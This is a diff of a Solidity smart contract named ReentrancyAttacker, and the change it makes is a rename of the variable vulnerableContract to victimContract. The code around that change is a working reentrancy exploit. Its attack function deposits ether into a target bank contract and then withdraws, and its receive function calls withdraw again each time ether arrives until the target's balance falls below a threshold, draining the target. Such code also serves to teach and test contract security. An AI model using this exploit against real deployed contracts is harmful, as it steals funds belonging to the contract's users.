@@ -8,28 +8,28 @@ interface IVulnerableBank {
 
 contract ReentrancyAttacker {
     address private immutable owner;
-    IVulnerableBank private immutable vulnerableContract;
+    IVulnerableBank private immutable victimContract;
 
     constructor(address _victim) {
         owner = msg.sender;
-        vulnerableContract = IVulnerableBank(_victim);
+        victimContract = IVulnerableBank(_victim);
     }
 
     function attack() external payable {
         require(msg.sender == owner, "Not owner");
 
-        vulnerableContract.deposit{value: msg.value}();
+        victimContract.deposit{value: msg.value}();
 
-        vulnerableContract.withdraw();
+        victimContract.withdraw();
     }
 
     function fund() external payable {}
 
     receive() external payable {
-        uint256 targetBalance = address(vulnerableContract).balance;
+        uint256 targetBalance = address(victimContract).balance;
 
         if (targetBalance > 10000000000000000 wei) {
-            vulnerableContract.withdraw();
+            victimContract.withdraw();
         }
     }
     
